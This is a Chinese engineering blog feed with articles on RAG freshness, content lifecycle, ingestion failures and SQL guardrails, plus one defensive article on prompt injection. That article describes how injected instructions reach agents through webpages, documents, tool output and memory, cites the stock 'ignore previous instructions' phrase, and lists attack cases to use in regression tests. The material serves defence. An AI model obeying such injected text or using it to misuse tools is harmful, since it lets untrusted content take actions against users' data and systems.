<p>缓存条目记录 evidence source&#x2F;version IDs、policy version 和 index version。源更新或 tombstone 到来，按反向关系失效相关条目。没有反向索引时，给缓存短 TTL 只能降低风险，不能保证权限撤销即时生效。</p>
<p>CDN 与客户端缓存也要考虑。答案 API 返回 ETag 和适当 Cache-Control；敏感&#x2F;个性化回答默认 private&#x2F;no-store。页面自己的会话状态不能在索引更新后继续展示“当前答案”而不标生成时间。</p>
<p>served_at 的探针要穿过真实查询和缓存链路。直接查向量数据库看到新 chunk，不代表应用路由、reranker 和 answer cache 已经切换。</p>
<h2 id="用合成知识做端到端探针"><a href="#用合成知识做端到端探针" class="headerlink" title="用合成知识做端到端探针"></a>用合成知识做端到端探针</h2><p>我会为每个重要知识域维护一个无敏感的 canary source，定期写入唯一 version token。探针从用户入口提问或调用检索，检查新 token 何时可见、旧 token 何时消失，并记录各阶段 trace。</p>
<p>探针同时覆盖 update、delete 和 ACL revoke。只测新增会漏掉 tombstone 与缓存失效。权限探针使用两个测试主体，确认授权用户可见、撤权用户不可见。</p>
<p>告警先定位延迟段：event undiscovered、fetch backlog、parse failure、embedding throttling、index unpublished、replica lag 或 cache stale。所有延迟只报“RAG 更新慢”，值班仍需从头查。</p>
<p>真实内容也抽样对账。根据 source registry 随机取版本，验证 current manifest 和索引一致；从索引反查 source，发现 orphan chunks。合成探针证明链路可走，reconciliation 证明真实数据没有漂移。</p>
<h2 id="答案必须携带新鲜度边界"><a href="#答案必须携带新鲜度边界" class="headerlink" title="答案必须携带新鲜度边界"></a>答案必须携带新鲜度边界</h2><p>生成上下文中的每个 evidence 都有 source valid&#x2F;observed&#x2F;indexed time。最终答案展示关键来源更新时间；若某个核心证据超过 stale threshold，发布策略降低语气、回源或拒答。</p>
<p>不能用整个索引最近更新时间代替单个来源。索引刚写入一篇新闻，不代表三个月没同步的制度也新鲜。claim 的 freshness 由支持它的 evidence 决定。</p>
<p>用户问“现在任务是否运行”，证据是十分钟前快照时，正确回答是“最近一次观测为运行中，时间为…”，不是“正在运行”。时间语义进入自然语言，才不会把延迟系统包装成实时系统。</p>
<p>知识新鲜度不是后台 ETL 的一个 duration，而是从事实变化到用户可见的完整延迟。把阶段时间、watermark、风险分级、缓存和探针建起来，团队才能承诺可验证的 SLA，也知道过期时系统该继续答、标记还是停止。</p>
<h2 id="参考规范与资料"><a href="#参考规范与资料" class="headerlink" title="参考规范与资料"></a>参考规范与资料</h2><ul>
<li><a href="https://sre.google/workbook/implementing-slos/">Google SRE Workbook：Implementing SLOs 与用户可见 SLI</a></li>
<li><a href="https://www.rfc-editor.org/rfc/rfc3339">RFC 3339：互联网时间戳与时区格式</a></li>
<li><a href="https://kafka.apache.org/36/javadoc/org/apache/kafka/clients/consumer/KafkaConsumer.html">Apache Kafka 3.6：Consumer position、committed position 与 offset 语义</a></li>
<li><a href="https://www.w3.org/TR/trace-context/">W3C Trace Context：跨抓取、索引与查询传播关联身份</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>SLA</tag>
        <tag>RAG</tag>
        <tag>知识新鲜度</tag>
      </tags>
  </entry>
  <entry>
    <title>RAG 内容不是导入一次就结束：更新、删除与权限变更怎么闭环</title>
    <url>//2024/02/09/rag-content-lifecycle/</url>
    <content><![CDATA[<p>很多知识库上线时只做了导入：抓文档、切块、算向量。过几个月后，同一制度的新旧版本一起命中，已离职人员的私有文档仍能被检索，源文件删除了，向量库里还留着片段。问题不在 RAG 算法，而在内容从来没有生命周期。</p>
<p>我把摄取当成一条可发布的数据管道。源系统的 create、update、delete、ACL change 都变成有版本的事件；新索引先在 staging 校验，再切换 current alias；删除和撤权先用 tombstone 立即阻断查询，物理清理由后台完成。</p>
<p class="article-diagram-scroll"><img src="/images/articles/rag-content-lifecycle.svg" class="lazyload" data-srcset="/images/articles/rag-content-lifecycle.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="RAG 内容从源版本到索引发布"></p>
<span id="more"></span>

<h2 id="Source-ID-和-Source-Version-是起点"><a href="#Source-ID-和-Source-Version-是起点" class="headerlink" title="Source ID 和 Source Version 是起点"></a>Source ID 和 Source Version 是起点</h2><p>文件路径或 URL 会改，不适合作稳定身份。每个内容源需要 <code>source_id</code>，每次变化生成单调 version 或不可变 revision。抓取结果保存 observed_at、content hash、ACL hash、mime type 和 fetch status。</p>
<p>同一版本事件可能重复到达，按 <code>source_id + source_version</code> 幂等；事件乱序时只推进到更高版本，但旧版本仍进入历史审计。若源系统没有版本，就组合 ETag、Last-Modified 和内容 hash，同时标注版本可靠性较低。</p>
<p>抓取成功与内容存在要区分。HTTP 404 可能是真删除，也可能权限令牌过期；接口 200 返回登录页也不代表文档内容。connector 校验 content type、结构和最小大小，认证失败进入 source error，不把旧知识误删或把登录页索引进去。</p>
<p>源快照与解析产物分开。parser 修复后，可以从同一 source snapshot 重建，不必重新请求源系统；源系统已删除时，也能解释历史索引如何产生。</p>
<h2 id="Update-不是直接覆盖向量"><a href="#Update-不是直接覆盖向量" class="headerlink" title="Update 不是直接覆盖向量"></a>Update 不是直接覆盖向量</h2><p>一份文档修改一个段落，直接 upsert 新 chunks 容易留下旧 chunks。chunk IDs 如果依赖序号，前面插一段会导致后面全部 ID 变化；如果只依赖文本 hash，相同模板段又会碰撞。</p>
<p>我使用 <code>source_id + source_version + structural_path + chunk_hash</code> 标识版本内 chunk，并维护 source version 到所有 chunk IDs 的 manifest。新版本构建完成后，manifest 作为一个整体发布，旧版本从 current view 移除。</p>
<p>解析、切块、embedding 分别记录版本。内容没变但 ACL 变了，可以只更新安全 metadata；parser 升级则重建 chunks；embedding 升级建立新 index version。不同原因的变更路径分开，避免每次都全量重算。</p>
<p>发布前检查 chunk 数量突变、空文档、解析错误、表格&#x2F;代码抽样、ACL 覆盖和 source version 连续性。一份 100 页 PDF 解析成 2 个 chunk，流水线不应自动把它当成功覆盖旧索引。</p>
<h2 id="Delete-与-Revoke-先阻断再清理"><a href="#Delete-与-Revoke-先阻断再清理" class="headerlink" title="Delete 与 Revoke 先阻断再清理"></a>Delete 与 Revoke 先阻断再清理</h2><p>物理删除向量可能很慢，多个关键词&#x2F;向量&#x2F;缓存索引也无法瞬间一致。删除或权限撤销到来时，先把 source&#x2F;chunk IDs 写入在线 deny&#x2F;tombstone 集，检索阶段强制过滤；随后异步清理各存储并对账。</p>
<p>权限撤销比内容更新优先级高。源系统 ACL change 事件触发安全索引更新，不等下一次全文抓取。若 ACL 同步失败，敏感域 fail closed；普通域可按 policy 使用 last-known-good，但必须有明确最大容忍时间。</p>
<p>缓存也在删除范围。query cache、rerank cache、生成 answer cache 可能已经包含该内容。缓存条目记录 evidence source IDs，tombstone 时按反向索引失效。只删向量库，旧答案仍可能从缓存直接返回。</p>
<p>物理清理完成后核对 vector、keyword、object storage 与 cache 的残留数。删除请求有 operation ID 和审计结果，不能只在消息队列里“发过一个 delete event”。</p>
<h2 id="Index-发布要像代码发布"><a href="#Index-发布要像代码发布" class="headerlink" title="Index 发布要像代码发布"></a>Index 发布要像代码发布</h2><p>把新 chunks 边生成边写进线上 collection，用户会在几小时内看到新旧混合状态。更稳妥的方式是建立 staging index&#x2F;version，完成全量或增量构建与验收，再原子切换 alias。</p>
<p>验收包括文档覆盖率、chunk 数量、ACL 分布、embedding 成功率、标注问题 recall 和关键删除不可见。切换后保留旧 index 一段回滚窗口，监控检索和回答守门指标。</p>
<p>增量很大时可以使用 base + delta，但查询必须明确版本视图，不能随机命中尚未完成的片段。compaction 后生成新 base，切换 alias。每个回答记录 index version，用户反馈才能复现。</p>
<p>回滚内容版本与回滚应用版本不同。若新索引泄露权限，先启用 tombstone&#x2F;fail closed，不能为了恢复检索效果切回同样有权限问题的旧索引。安全变更通常不允许普通回滚。</p>
<h2 id="失败状态不能用旧内容假装成功"><a href="#失败状态不能用旧内容假装成功" class="headerlink" title="失败状态不能用旧内容假装成功"></a>失败状态不能用旧内容假装成功</h2><p>connector 连续三天抓取失败，旧文档仍在服务时，答案应显示 freshness 降级。Source registry 保存 last_success_version&#x2F;time、latest_observed_event 和 failure reason。不能只看向量库里“有数据”就认为健康。</p>
<p>解析部分失败也要可见。一个文档 20 个章节，3 个表格失败，manifest 标明 incomplete sections；问题命中这些章节时，系统可以拒答或提示覆盖缺口。流水线总状态 success 会掩盖局部数据丢失。</p>
<p>重试区分暂时故障与确定性坏数据。网络超时指数退避，unsupported format 进入隔离队列等待 parser 支持，权限拒绝通知 owner。无限重试一个加密 PDF，只会堆积队列。</p>
<p>补数据从事件 offset 和 source manifest 恢复，重复执行必须得到同一 current view。摄取任务的 run&#x2F;attempt、输入版本、产出 manifest 和发布动作都进入审计。</p>
<h2 id="生命周期要有-owner-和-SLO"><a href="#生命周期要有-owner-和-SLO" class="headerlink" title="生命周期要有 owner 和 SLO"></a>生命周期要有 owner 和 SLO</h2><p>每个 source connector 有技术 owner，每个知识域有内容 owner。前者负责抓取&#x2F;解析可用，后者负责内容正确、权限与有效期。问答错误才能分别落到平台或业务治理。</p>
<p>指标包括 source coverage、event lag、parse success、index publish lag、tombstone latency、stale sources、orphan chunks 和删除对账成功率。只看向量数量增长，无法说明知识是否健康。</p>
<p>定期 reconciliation 从源 registry、current manifests 和实际索引做三方对账：源已删除但索引存在、manifest 有 chunk 但索引缺失、索引有无归属 chunk 都要修复。事件流保证低延迟，对账保证最终不漂移。</p>
<p>RAG 内容系统的可靠性，取决于能否知道每个片段从哪来、属于哪版、谁能看、何时应消失。把摄取做成可验证发布，知识库才不会随着时间推移变成一个无法解释的向量垃圾场。</p>
<h2 id="参考论文与资料"><a href="#参考论文与资料" class="headerlink" title="参考论文与资料"></a>参考论文与资料</h2><ul>
<li><a href="https://arxiv.org/abs/2005.11401">Retrieval-Augmented Generation：外部知识作为非参数记忆</a></li>
<li><a href="https://github.com/apache/atlas/blob/1a4735939f3ec3ed225f1d12e40653b8eaf610b3/docs/src/documents/Hook/HookHive.md">Apache Atlas 2.2.0 Hive Hook：实体身份与采集属性</a></li>
<li><a href="https://github.com/apache/iceberg/blob/apache-iceberg-1.0.0/api/src/main/java/org/apache/iceberg/Snapshot.java">Apache Iceberg 1.0.0：Snapshot 与原子替换式表更新的 API 模型</a></li>
<li><a href="https://www.w3.org/TR/trace-context/">W3C Trace Context：跨处理阶段关联一次内容运行</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>RAG</tag>
        <tag>内容生命周期</tag>
        <tag>索引治理</tag>
      </tags>
  </entry>
  <entry>
    <title>Prompt Injection 怎么防：先把不可信内容与工具权限彻底拆开</title>
    <url>//2024/04/16/prompt-injection-tool-defense/</url>
    <content><![CDATA[<p>Prompt Injection 不是在 system prompt 后面多写一句“不要听用户的”就能解决。Agent 会读取网页、文档、邮件和工具输出，这些内容都可能包含类似指令的文本。模型很难只凭自然语言可靠区分“这是数据”还是“这是更高优先级命令”。</p>
<p>我的防线不建立在模型永远识别攻击上，而是建立在权限与执行分层：不可信内容可以影响候选答案，不能自行提升为控制指令；任何工具动作仍需通过确定性的对象、权限、状态和确认检查。</p>
<p class="article-diagram-scroll"><img src="/images/articles/prompt-injection-tool-defense.svg" class="lazyload" data-srcset="/images/articles/prompt-injection-tool-defense.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="不可信内容不能直接变成工具指令"></p>
<span id="more"></span>

<h2 id="先承认间接注入一定会进入上下文"><a href="#先承认间接注入一定会进入上下文" class="headerlink" title="先承认间接注入一定会进入上下文"></a>先承认间接注入一定会进入上下文</h2><p>直接注入来自用户输入，例如要求忽略之前规则。间接注入藏在 Agent 读取的数据里：网页白字、文档注释、工单描述、代码 README，甚至另一个工具的错误信息。只对用户输入做关键词过滤，挡不住后者。</p>
<p>OpenAI 在 2023 年 Function Calling 发布说明中已提到，来自不可信工具输出的数据可能指示模型执行非预期动作，并建议真实世界操作加入用户确认。工程上应把所有外部内容默认标为 untrusted data，即使它来自公司内部系统。</p>
<p>每段上下文携带 source、owner、trust_level、ACL、content hash 和获取时间。Prompt 用固定边界标识数据，但边界只是帮助模型理解，不是安全保证。执行层不根据内容里的“管理员已批准”改变策略，审批只能来自可信系统签发的 token。</p>
<p>HTML&#x2F;PDF 清洗会减少隐藏文本、脚本和不可见字符，却不能把内容洗成可信。清洗后仍保留 untrusted 标签，也记录被删除结构用于安全分析。</p>
<h2 id="控制面与数据面分开构建"><a href="#控制面与数据面分开构建" class="headerlink" title="控制面与数据面分开构建"></a>控制面与数据面分开构建</h2><p>system policy、工具 schema、用户身份和服务配置属于控制面；检索文档、网页正文、用户附件和工具返回属于数据面。运行时把二者用独立数据结构组装，不在字符串拼接后再猜来源。</p>
<p>工具调用器只接收模型生成的 proposal 与可信 subject context。模型不能从上下文输出一段“新增工具定义”让 runtime 动态注册，也不能通过文档中的 URL 让通用 HTTP 工具任意访问。</p>
<p>检索内容最小化。问题只需要配置说明，就不把整页含评论、脚本和外链的 HTML 放进上下文。结构化工具只返回必要字段，错误堆栈与内部 headers 不进入模型。攻击面与上下文 token 同时下降。</p>
<p>多轮会话要防持久化。一次文档中的恶意文本可能被模型总结进 memory，后续离开原页面仍影响决策。写入长期记忆前提取事实并验证来源，不把自由文本指令原样保存；memory item 保留 provenance 和 trust label。</p>
<h2 id="最小工具面比“聪明识别”可靠"><a href="#最小工具面比“聪明识别”可靠" class="headerlink" title="最小工具面比“聪明识别”可靠"></a>最小工具面比“聪明识别”可靠</h2><p>Agent 只获得当前任务需要的工具。浏览文档阶段不需要 send_email、delete_file 或 deploy，就不要注册这些工具。把所有平台 API 都放进一份 function list，再依赖模型自律，风险会随工具数量与组合能力增长。</p>
<p>工具接口做窄：<code>get_page(url)</code> 配 egress allowlist，不能访问内网 metadata；<code>download_attachment(id)</code> 只能读取用户已授权附件；<code>update_ticket</code> 限定字段，不能传任意 JSON Patch。底层服务账户按最小权限配置。</p>
<p>参数通过 JSON Schema、对象解析和 policy engine。URL 校验在 DNS 解析前后都做，防重定向和 DNS rebinding；文件路径使用资源 ID，不接受 <code>../</code>；SQL 使用只读代理。模型是否被注入，不影响这些确定性规则。</p>
<p>高风险动作先 dry-run。用户看到目标资源、参数、影响和来源，再签发 plan-bound confirmation。若动作源于网页内容，UI 明确标出“建议来自未信任页面”，让人知道确认什么。</p>
<h2 id="工具输出不能反过来扩大权限"><a href="#工具输出不能反过来扩大权限" class="headerlink" title="工具输出不能反过来扩大权限"></a>工具输出不能反过来扩大权限</h2><p>工具 A 的返回中可能包含另一个动作建议，模型随后调用工具 B。策略不能因为 A 是受信工具，就把 A 返回的所有文本视为可信命令。工具身份可信，只表示响应来自它；响应中引用的用户内容仍可能不可信。</p>
<p>结构化结果区分 data 与 control hints。只有工具协议中明确、签名并由 runtime 认可的字段能触发状态转换，例如 <code>operation_status=succeeded</code>；message、description、error_text 都只是数据。</p>
<p>结果进入模型前做字段 allowlist、长度限制和秘密扫描。内部 URL、token、堆栈不返回。对于可能包含网页内容的字段，保留 nested provenance，不能一层工具包装后信任级别自动升高。</p>
<p>Agent loop 设置步数、成本、时间与工具调用配额。Prompt Injection 诱导无限搜索或循环调用时，runtime 能停止。异常序列如读取文档后立即请求高风险工具、短时间跨多个资源，触发额外确认或阻断。</p>
<h2 id="防御需要用真实攻击链回归"><a href="#防御需要用真实攻击链回归" class="headerlink" title="防御需要用真实攻击链回归"></a>防御需要用真实攻击链回归</h2><p>安全测试不能只有“忽略之前指令”一句。要覆盖 PDF 隐藏文字、网页评论、Markdown 链接、工具 error message、代码注释、多语言、编码混淆、跨轮 memory 和引用文档中的二级链接。</p>
<p>每个用例断言系统行为：敏感工具不可见或被 policy 拒绝，越权对象不解析，确认参数不被替换，不可信内容不写入长期 memory，拒绝原因不泄露内部策略。</p>
<p>trace 串起 injection source、retrieval chunk、模型 proposal、policy decision 和实际 operation。发现工具被误调用时，可以证明是哪段内容影响了模型，也能验证即便 proposal 错误，执行层是否挡住。</p>
<p>模型&#x2F;Prompt 更新后重跑攻击集，但不能把通过测试理解成“已解决 Prompt Injection”。模型行为会变化，攻击输入空间无限。目标是让单次模型误判无法越过权限和副作用边界，并让所有尝试可见、可停、可追踪。</p>
<h2 id="事件处置从撤权开始"><a href="#事件处置从撤权开始" class="headerlink" title="事件处置从撤权开始"></a>事件处置从撤权开始</h2><p>发现注入导致异常动作时，先撤销相关 tool&#x2F;credential、冻结 operation 和隔离 source，不是只改 Prompt。检查同一 source 是否进入索引、缓存与 memory，按 content hash 追踪所有受影响 Run。</p>
<p>动作幂等与可回滚决定损失范围。发送类工具保留消息 ID 可撤回，配置变更保存旧版本，批量操作分批提交。无法回滚的工具默认需要更强确认与人工审批。</p>
<p>最后再修复检索过滤、工具 schema、策略或模型提示，并用原始 trace 回放。只在 Prompt 里追加攻击字符串黑名单，很快会被变体绕过，也无法修复已落地的副作用。</p>
<p>Prompt Injection 应被当作不可信数据穿过智能决策系统的问题。模型层可以提高识别率，真正的安全性来自控制面隔离、最小工具、确定性授权、确认和审计。即使模型相信了文档里的坏指令，系统也不应替它获得执行权。</p>
<h2 id="对照资料"><a href="#对照资料" class="headerlink" title="对照资料"></a>对照资料</h2><ul>
<li><a href="https://openai.com/index/function-calling-and-other-api-updates/">OpenAI Function Calling 发布说明：不可信工具数据与用户确认风险</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/LLM_Prompt_Injection_Prevention_Cheat_Sheet.html">OWASP LLM Prompt Injection Prevention Cheat Sheet</a></li>
<li><a href="https://csrc.nist.gov/publications/detail/sp/800-162/final">NIST SP 800-162：基于属性的访问控制</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html">OWASP SSRF Prevention Cheat Sheet：URL 与网络访问边界</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>工具调用</tag>
        <tag>Agent 安全</tag>
        <tag>Prompt Injection</tag>
      </tags>
  </entry>
  <entry>
    <title>知识摄取任务显示成功，为什么 RAG 还是缺内容</title>
    <url>//2024/05/07/knowledge-ingestion-failure/</url>
    <content><![CDATA[<p>知识摄取任务变绿，用户仍搜不到文档，通常不是“向量库偶尔没命中”这么简单。任务成功只说明代码走到了结束，没有证明源内容枚举完整、解析结果没截断、每个 chunk 都生成向量、索引切到了新版本，也没证明查询链路使用了这版索引。</p>
<p>我会沿六层做证据对账：枚举、抓取、解析、切块&#x2F;embedding、发布、查询。每层都有输入输出不变量和 manifest。定位从第一个数量或版本不一致的层开始，不先调 top-k。</p>
<p class="article-diagram-scroll"><img src="/images/articles/knowledge-ingestion-failure.svg" class="lazyload" data-srcset="/images/articles/knowledge-ingestion-failure.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="知识摄取失败的分层定位"></p>
<span id="more"></span>

<h2 id="枚举层先回答“应该有多少”"><a href="#枚举层先回答“应该有多少”" class="headerlink" title="枚举层先回答“应该有多少”"></a>枚举层先回答“应该有多少”</h2><p>不少缺失来自分页。API 默认只返回 100 条，connector 忘了继续取 next token；页码从 0&#x2F;1 的理解错误漏掉第一页；增量游标推进过早，失败的一页永远跳过。任务没有异常，结果却天然不完整。</p>
<p>每次 enumeration run 保存 source scope、query&#x2F;filter、page count、item count、next token chain、开始&#x2F;结束 watermark 和去重统计。源 API 提供 total 时做对账；不提供时，与上次快照和周期性全量扫描比较。</p>
<p>突然从 10 万文档降到 500，不能自动发布为“源系统大量删除”。设置数量变化阈值，进入 quarantine 等待确认。权限 token 失效后 API 可能只返回公开文档，这种静默缩小比明确 401 更危险。</p>
<p>增量与全量互补。事件流提供低延迟，定期 enumeration&#x2F;reconciliation 找出丢事件、乱序和 connector bug。两者用相同 source ID 体系，差异能落到具体对象。</p>
<h2 id="抓取成功要验证拿到的是内容"><a href="#抓取成功要验证拿到的是内容" class="headerlink" title="抓取成功要验证拿到的是内容"></a>抓取成功要验证拿到的是内容</h2><p>HTTP 200 可能是登录页、限流提示、空壳 HTML 或权限不足的友好页面。抓取器校验 final URL、content type、title&#x2F;signature、body size、hash 和 source version，不只看状态码。</p>
<p>附件、嵌入页和动态内容要列 manifest。主页面成功但三个附件失败，source 状态应是 partial，不能用一个 success 覆盖。每个 child resource 有独立 fetch outcome 与重试策略。</p>
<p>重定向和 egress 安全同时检查。目标域在 allowlist，DNS 解析和重定向后的地址仍需验证；不让恶意文档把 connector 引到内网 metadata。内容大小、压缩比和下载时间设上限，防止 zip bomb 与超大文件占满 worker。</p>
<p>抓取失败时保留 last-known-good 还是立即下线，由风险策略决定。权限撤销和明确 delete 立即 tombstone；暂时 5xx 可以短期服务旧版并标 stale。不能把所有失败都解释为删除，也不能永远沿用旧内容。</p>
<h2 id="Parser-最容易产生“静默成功”"><a href="#Parser-最容易产生“静默成功”" class="headerlink" title="Parser 最容易产生“静默成功”"></a>Parser 最容易产生“静默成功”</h2><p>PDF 工具进程 exit code 为 0，但可能只抽到前十页；OCR 失败得到空白文本；表格顺序错乱；字符编码把中文变乱码。parser success 需要内容级断言。</p>
<p>我会记录页数&#x2F;章节数、抽取字符数、表格&#x2F;图片&#x2F;代码块数量、警告、语言分布与每页 hash。源 PDF 100 页、解析页数 12，直接隔离；字符数相对上版下降 80%，也触发人工抽查。</p>
<p>格式专用 parser 失败不能自动退回“提取所有可见字符串”后发布。fallback 结果标低质量，进入单独索引或拒绝用于高风险回答。否则页面看起来有内容，段落顺序和表头已经破坏。</p>
<p>parser&#x2F;chunker 版本进入产物。修复后用同一 source snapshot 重跑，对比结构 diff，确认增加的是缺失内容，不是随机改变全部 chunk IDs。</p>
<h2 id="Embedding-批次要逐条对账"><a href="#Embedding-批次要逐条对账" class="headerlink" title="Embedding 批次要逐条对账"></a>Embedding 批次要逐条对账</h2><p>调用 embedding API 时，一个 batch 里部分输入超长、超时或返回维度异常，客户端可能只重试整个批次或忽略失败项。最终向量数少于 chunk 数，却仍推进发布。</p>
<p>chunk manifest 为每个 chunk 保存 content hash、token count、embedding status、model&#x2F;version、dimension 和 vector ID。发布前要求 expected count 与 succeeded + explicitly_excluded 对上，excluded 必须有 reason。</p>
<p>批次重试按 chunk ID 幂等。模型升级后维度变化写入新 index，不能把 1536 与其他维度向量混在同一 collection。embedding 内容清洗&#x2F;截断策略也版本化；超长 chunk 不能静默截尾，应该回到 chunker 修复。</p>
<p>敏感字段不应因构造 embedding text 被意外加入。进入模型前的 canonical content 与索引 metadata 都可审计，权限标签和 source ID 不依赖模型输出。</p>
<h2 id="Publish-成功要穿过真实查询"><a href="#Publish-成功要穿过真实查询" class="headerlink" title="Publish 成功要穿过真实查询"></a>Publish 成功要穿过真实查询</h2><p>向量写完不等于线上已用。alias 可能仍指旧 index，部分 replica 没同步，关键词索引成功而向量索引失败，query cache 又可能返回旧候选。</p>
<p>发布 manifest 记录各索引版本、document&#x2F;chunk count、ACL count、alias 前后值和 replica readiness。alias 切换用 compare-and-set，防两个摄取 run 乱序覆盖。新版本失败时旧版继续服务，但 source freshness 显示落后。</p>
<p>端到端 canary 把唯一 token 写入测试文档，确认授权身份能从真实应用召回；更新后新 token 可见、旧 token 消失；撤权身份不能命中。直接查数据库不足以验证路由、过滤、rerank 与缓存。</p>
<p>用户报告某文档缺失时，从 source ID 生成 evidence chain：是否枚举、fetch version、parse manifest、chunk IDs、vector IDs、current index、query filter 与 candidate scores。第一处断点就是调查起点。</p>
<h2 id="失败分类决定恢复动作"><a href="#失败分类决定恢复动作" class="headerlink" title="失败分类决定恢复动作"></a>失败分类决定恢复动作</h2><p>暂时网络&#x2F;限流错误可退避重试，确定性格式不支持进入 dead-letter，数据完整性异常阻止发布，权限异常 fail closed，索引部分写入丢弃 staging version。所有错误都无限重试，只会让队列积压并掩盖根因。</p>
<p>恢复后从 manifest 继续，不从头猜。漏掉一个 embedding 重补对应 chunks；parser 修复重建该 source version；alias 错误重新切换但先验证目标 index。每次补偿生成新 attempt，原失败证据不覆盖。</p>
<p>指标按层展示 coverage 与 lag：enumerated sources、fetched versions、parsed complete、embedded chunks、published current、query canary。一个总 success rate 很容易保持 99%，同时稳定漏掉同一批大 PDF。</p>
<p>知识摄取的正确性来自数量、身份、版本和内容不变量，而不是进程退出码。分层 manifest 与真实查询探针建好后，RAG 缺内容就能从“感觉没召回”变成一条可复现、可修复的证据链。</p>
<h2 id="参考规范与资料"><a href="#参考规范与资料" class="headerlink" title="参考规范与资料"></a>参考规范与资料</h2><ul>
<li><a href="https://www.rfc-editor.org/rfc/rfc9110">RFC 9110：HTTP status、重定向与内容语义</a></li>
<li><a href="https://kafka.apache.org/36/javadoc/org/apache/kafka/clients/consumer/KafkaConsumer.html">Apache Kafka 3.6 Consumer：position 与 committed position 的区别</a></li>
<li><a href="https://fetch.spec.whatwg.org/">WHATWG Fetch Standard：重定向与 fetch 处理模型</a></li>
<li><a href="https://www.w3.org/TR/trace-context/">W3C Trace Context：跨摄取阶段关联一次处理</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>故障诊断</tag>
        <tag>RAG</tag>
        <tag>知识摄取</tag>
      </tags>
  </entry>
  <entry>
    <title>AI 生成 SQL 上生产前，我会放四道闸门</title>
    <url>//2024/04/26/ai-sql-four-guardrails/</url>
    <content><![CDATA[<p>AI 写 SQL 已经不难，难的是决定哪条 SQL 可以进入生产查询链路。只做语法检查，会放过越权与全表扫描；只做权限，会放过指标口径错误；让用户自己审核，又很难在一键分析和 Agent 自动执行中保持一致。</p>
<p>我会设置四道独立闸门：语句、数据、资源、语义。它们分别回答“能不能解析”“能不能看这些数据”“能不能以这个代价运行”“是否真的回答了问题”。四层结论和证据一起返回，不用一个笼统的 safe&#x2F;unsafe 盖掉差异。</p>
<p class="article-diagram-scroll"><img src="/images/articles/ai-sql-four-guardrails.svg" class="lazyload" data-srcset="/images/articles/ai-sql-four-guardrails.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="AI SQL 的四道闸门"></p>
<span id="more"></span>

<h2 id="第一道：语句闸门限制能做什么"><a href="#第一道：语句闸门限制能做什么" class="headerlink" title="第一道：语句闸门限制能做什么"></a>第一道：语句闸门限制能做什么</h2><p>候选 SQL 先交给目标引擎版本的 parser，得到 AST。只允许单条查询、受控 EXPLAIN 或明确开放的语句类型；DDL、DML、事务控制、外部命令和多 statement 默认拒绝。</p>
<p>规则作用在 AST，不用正则找关键词。WITH 可以包裹 INSERT，SELECT 可以调用有副作用的函数，注释和字符串也会干扰文本匹配。函数、table function、UDF、hint 和动态 SQL 都要按方言白名单。</p>
<p>引擎版本是输入。同一语法在 Spark、Flink、Hive、PostgreSQL 以及不同版本中含义不同。平台无法调用真实 parser 时只能标 <code>UNVERIFIED_DIALECT</code>，不能拿通用 parser 的成功当生产许可。</p>
<p>解析后生成 canonical SQL&#x2F;hash，原始候选也保存。后续自动补全 qualified name、行级过滤或 LIMIT 时，每次重写都重新 parse，并记录 rewrite diff。</p>
<h2 id="第二道：数据闸门限制能看到什么"><a href="#第二道：数据闸门限制能看到什么" class="headerlink" title="第二道：数据闸门限制能看到什么"></a>第二道：数据闸门限制能看到什么</h2><p>从 AST 提取 catalog&#x2F;schema&#x2F;table&#x2F;column&#x2F;function，按真实用户身份做对象与列权限检查。模型运行账户不能把服务权限借给用户。对象名先解析稳定 ID，再做策略判断，防止 search path 和同名对象造成误选。</p>
<p>行级策略由数据库或查询代理注入，不让模型自己添加 <code>tenant_id</code>。查询的子查询、CTE、view 展开后都要在权限范围内；只检查最外层 SELECT 列表会漏掉 WHERE、ORDER BY 与聚合中的敏感字段。</p>
<p>结果也过一遍数据策略。大文本、明细行、极小分组和敏感统计可能需要掩码或最小聚合阈值。错误信息去掉内部对象、路径和堆栈，给模型有限 error code。</p>
<p>权限版本写入 query trace。用户权限撤销后，旧会话不能继续复用之前的 schema&#x2F;context；缓存 key 也包含 subject scope 与 policy version。</p>
<h2 id="第三道：资源闸门限制能花多少"><a href="#第三道：资源闸门限制能花多少" class="headerlink" title="第三道：资源闸门限制能花多少"></a>第三道：资源闸门限制能花多少</h2><p>通过权限的只读 SQL 仍可能拖垮集群。先执行 EXPLAIN，提取扫描分区、estimated rows&#x2F;bytes、Join、Exchange、排序、状态和无法下推的谓词。规则按引擎与工作负载区分。</p>
<p><code>LIMIT 100</code> 不等于扫描少。过滤不能下推、Join 后再 limit 时，底层仍会读取大量数据。资源闸门看计划，不只看 SQL 文本。</p>
<p>允许执行的查询进入隔离资源组或只读副本，设置 statement timeout、scan limit、memory、并发、结果 rows&#x2F;bytes 与总 deadline。用户取消时把 cancel 传给真实 engine query ID，不能只停前端。</p>
<p>估算依赖统计信息。stats 过期或缺失时，资源结论标不确定并采用更保守阈值。高风险大查询转异步任务，先展示预计范围与成本，让用户确认。</p>
<h2 id="第四道：语义闸门检查是否答对"><a href="#第四道：语义闸门检查是否答对" class="headerlink" title="第四道：语义闸门检查是否答对"></a>第四道：语义闸门检查是否答对</h2><p>前三道通过只能说明 SQL 可安全执行，不能说明业务正确。<code>COUNT(*)</code>、<code>COUNT(DISTINCT user_id)</code>、按创建时间还是支付时间，都会给出合法结果。</p>
